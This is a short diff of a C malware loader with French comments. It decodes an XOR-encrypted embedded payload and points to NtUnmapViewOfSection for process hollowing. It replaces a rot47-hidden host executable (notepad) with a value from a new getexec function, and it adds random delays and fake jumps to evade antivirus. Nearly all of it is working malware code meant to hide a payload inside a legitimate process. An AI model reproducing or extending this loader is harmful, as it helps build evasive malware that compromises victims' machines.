@@ -8,7 +8,7 @@ int extern getfunction( int kernel, int library ) asm ("_getfunction");
 int extern ostring(unsigned char *stringoff) asm ("_ostring") ; // (unsigned char *);
 int extern str_ntdll() asm ("str_ntdll"); 
 int extern str_LoadLibrary() asm ("str_LoadLibrary"); 
-
+int extern getexec() asm ("_getexec"); 
 
 // Redeclaration des type des fonctions offusquee 
 //http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtUnmapViewOfSection.html
@@ -164,15 +164,14 @@ int dexor(unsigned char * lpayload,int lpayloadlen,unsigned char * lkey ) {
 	}
 }
 
+
 // Main program
 
 unsigned char* buffer;
 int payloadlen7;
-
 int main()
 
 {
-
 int dummy = vaauxfraises(41414141);
 buffer = (unsigned char*) malloc (payloadlen);
 payloadlen7=conv7to8( payload,buffer,payloadlen);
@@ -180,10 +179,10 @@ payloadlen7=conv7to8( payload,buffer,payloadlen);
 
 
 memcpy(payload,buffer,payloadlen7);
-// Ce exe sera notepad
-char fakeexe[]="ri-H:?5@HD-?@E6A25]6I6";
-rot47(fakeexe);
 
+char  fakeexe[255];
+strcpy(fakeexe,(char *)getexec());
+//MessageBox(0, fakeexe, "DLL Message", MB_OK | MB_ICONINFORMATION);
 
 // Random delay et faux jump
 if (startrand()==1) {
